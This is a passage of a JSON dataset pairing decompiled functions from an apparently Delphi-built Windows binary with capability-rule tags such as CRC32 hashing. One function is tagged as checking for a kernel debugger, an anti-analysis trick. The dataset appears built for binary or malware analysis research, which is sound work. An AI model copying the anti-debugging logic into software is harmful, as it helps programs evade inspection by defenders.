        "decompiled_code": "\nvoid __fastcall fcn.00436998(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x44) = 0;\n    }\n    else {\n        if (*(in_EAX + 0x44) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x44) = uVar2;\n        }\n        (**(**(in_EAX + 0x44) + 0xc))();\n        iVar1 = *(in_EAX + 0x44);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x436c30;\n        fcn.0040484c();\n        fcn.00420018();\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00437b2c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00437b2c(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x437c5f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.00437b2c::pwszKLID;\n    puStack60 = 0x437b59;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x437b65;\n    var_ch = fcn.00421644();\n    uStack64 = 0x437c35;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x437b83;\n    puStack60 = &stack0xfffffffc;\n    fcn.00421720();\n    puStack72 = 0x437b93;\n    fcn.004057a0();\n    puStack72 = 0x437ba3;\n    fcn.00405864();\n    puStack72 = 0x437bae;\n    fcn.00421988();\n    puStack72 = 0x437bbe;\n    fcn.00421fe8();\n    puStack72 = 0x437bcb;\n    uVar1 = fcn.0040fa00();\n    uStack76 = 0x437c18;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x437cbc);\n    iVar3 = (*pcVar2)();\n    *0x4904ec = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x437c1f;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 614
    },
    "00438078": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438078(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.00438680(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.0040a888();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0043911c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043911c(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x492410 < 5) && ((**0x492410 != 4 || (**0x492640 < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.0040484c();\n    cVar2 = fcn.004047dc();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.00424f38();\n            fcn.0042467c();\n        }\n        else {\n            fcn.00424f38();\n            fcn.0042467c();\n        }\n    }\n    else {\n        fcn.00424f38();\n        fcn.0042467c();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 287
    },
    "0043bb68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0043bb68(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43bbbc;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x43bbbc | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "0043ce70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ce70(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.0043c58c();\n        fcn.0043c58c();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.0043c6dc();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.0043c6dc();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 347
    },
    "0043e37c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e37c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.0043fd64();\n        }\n        fcn.00450724();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "00440a40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440a40(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x440af0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x00440ada;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x00440ab3;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x00440a92:\n        puStack24 = puVar1;\n        fcn.00407550();\n        fcn.0040daec();\n        fcn.00404ec4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.0043bcbc();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x00440a92;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.0040484c();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x00440a92;\n        }\n    }\ncode_r0x00440ab3:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.00440e14();\n        }\n        fcn.0040484c();\n    }\ncode_r0x00440ada:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x440af7;\n    uStack28 = 0x440aef;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 564
    },
    "004414cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004414cc(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.00458568(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "00443520": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443520(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044fe94();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fb50();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0044355c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044355c(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044fec8();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043fb50();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00443604": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044364d)\n// WARNING: Removing unreachable block (ram,0x0044366d)\n// WARNING: Removing unreachable block (ram,0x00443676)\n// WARNING: Removing unreachable block (ram,0x0044367b)\n// WARNING: Removing unreachable block (ram,0x00443688)\n// WARNING: Removing unreachable block (ram,0x0044368d)\n// WARNING: Removing unreachable block (ram,0x0044369a)\n\nvoid fcn.00443604(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4436e4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.00456f1c();\n    if (iVar1 == 1) {\n        fcn.00450774();\n        fcn.00405620();\n        fcn.004059dc();\n        fcn.00450784();\n        fcn.00450834();\n    }\n    fcn.00456d80();\n    fcn.0044fb88();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.0043e37c();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4436eb;\n    uStack32 = 0x4436e3;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 393
    },
    "00443aa4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00443aa4(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x492400)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 108
    },
    "0044f8fc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f8fc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x44f998 == cVar1) || (*0x44f998 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.0044fd10();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 269
    },
    "0044f99c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f99c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404650();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.0040484c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x452e7c;\n        fcn.0040484c();\n        fcn.00420018();\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0044fb88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fb88(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0044f8fc();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.0040484c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 349
    },
    "0044fc70": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044fc70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.00452500();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.00450c5c();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0044fd10();\n        fcn.0045339c();\n        (**(*in_EAX + 0x80))();\n        fcn.00451abc(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0044fd10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044fd10(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00418410();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x44fe90 == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 847
    },
    "004500ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004500ec(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 1;\n    }\n    *(in_EAX + 0x160) = param_2;\n    return;\n}\n",
        "token_count": 90
    },
    "00450100": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450100(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 0;\n    }\n    fcn.00405584();\n    return;\n}\n",
        "token_count": 72
    },
    "0045040c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045040c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x4505c0;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.004502c0();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x4505c8 != (uVar2 & *0x4505c4)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x4505c8 != (uVar2 & *0x4505cc)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.004249c0(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.004249dc();\n        }\n    }\n    *(in_EAX + 0x23) = *0x4505c8;\n    return;\n}\n",
        "token_count": 823
    },
    "004505ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.004505ec(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450682;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.00450804();\n        fcn.00405974();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004047dc();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x0045064e;\n            }\n            bVar2 = true;\n            goto code_r0x00450654;\n        }\n    }\ncode_r0x0045064e:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x00450654:\n    fcn.004204b4();\n    if (bVar2) {\n        fcn.00450834();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x450689;\n    uStack32 = 0x450681;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 455
    },
    "00450a7c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450a7c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.004198e4();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.0041977c();\n                fcn.00419904();\n                fcn.00450c5c();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.0043bd10();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.0040484c();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00450f40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450f40(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.0045d514();\n    if (cVar1 != '\\0') {\n        fcn.0045d5d4();\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040dba8();\n        fcn.00404ec4();\n    }\n    fcn.00451af0();\n    if ((*0x497c80 == 0) || (*0x497c80 == -1)) {\n        *0x497c80 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.00450344();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.00451abc(uStack28);\n        }\n        if (*0x497c80 != -1) {\n            fcn.0044e7d4();\n        }\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "004528c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004528c4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x452970 == (*0x45296c & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] != 0)) && ((*(in_EAX + 0x55) & 